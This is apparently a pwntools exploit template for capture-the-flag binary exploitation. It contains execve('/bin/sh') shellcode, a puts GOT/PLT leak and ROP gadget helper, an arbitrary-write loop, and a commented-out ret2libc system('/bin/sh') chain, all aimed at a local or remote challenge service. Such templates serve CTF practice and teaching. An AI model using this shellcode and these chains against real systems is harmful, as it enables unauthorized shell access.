from pwn import *
import sys
context.arch        ='amd64'
CHALLENGE = './challenge'
IP = "0.0.0.0"
PORT = 31337
TEAM = 1
'''
Libc Lib:
    https://libc.rip/
'''
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

DEBUG = False if len(sys.argv) > 1 else True
if DEBUG:
    p=process(CHALLENGE,env={"LD_PRELOAD":"../libc.so.6"})
else:
    p = remote(IP,PORT)

ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
def num(x):
    return str(x).encode()
def cmd(c):
    sla("",num(c))
def leak(a,x=0,mute=0):
    ru(a)
    if x: # when to stop
        leaked = int(ru(x)[:-1],16)
    else:
        leaked = u64(p.read(6)+b'\0\0')
    if mute==0:
        warn(hex(leaked))
    return leaked
def debug(script):
    if DEBUG:
        gdb.attach(p,script)
def asmsh():
    sh ='''
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    mov al, 0x3b
    mov rdi,0x68732f6e69622f2f
    push rdx
    push rdi
    mov rdi,rsp
    syscall
    '''
    return asm(sh)#shellcraft.sh())
def PRM(base=0x400000):
    elf = ELF(CHALLENGE)
    elf.address = base
    bin_rop = ROP(elf)
    rdi = bin_rop.find_gadget(['pop rdi','ret'])[0]
    got = elf.got['puts']
    plt = elf.plt['puts']
    main = elf.sym['main']
    return [rdi,got,plt,main]


def kv(k,v,ctn=1):
    # Write a function set address k to v
    pass


def aarLoop(addr,pay,func,pad=b'\x90'):
    padlen = (8-(len(pay) % 8)) if len(pay) % 8 else 0
    pay+= padlen*pad
    total = len(pay)
    for slot in range(int(total/8)):
        if slot != int(total/8)-1:
            func(addr+slot*8,u64(pay[slot*8:slot*8+8]))
        else:
            func(addr+slot*8,u64(pay[slot*8:slot*8+8]),0)


PIE_BASE = 0x555555554000
context.log_level   ='debug'
debug('b * ')



# libc = ELF("../libc.so.6")

# libc.address = base
# rop     = ROP(libc)
# rdi     = rop.find_gadget(['pop rdi','ret'])[0]
# ret     = rdi+1
# sh_str  = libc.search(b"/bin/sh\0").__next__()
# system  = libc.sym['system']
# chain   = [ret]*1 + [rdi,sh_str,system]

if not DEBUG:
    sl(f"./submitter {TEAM}")
p.interactive()
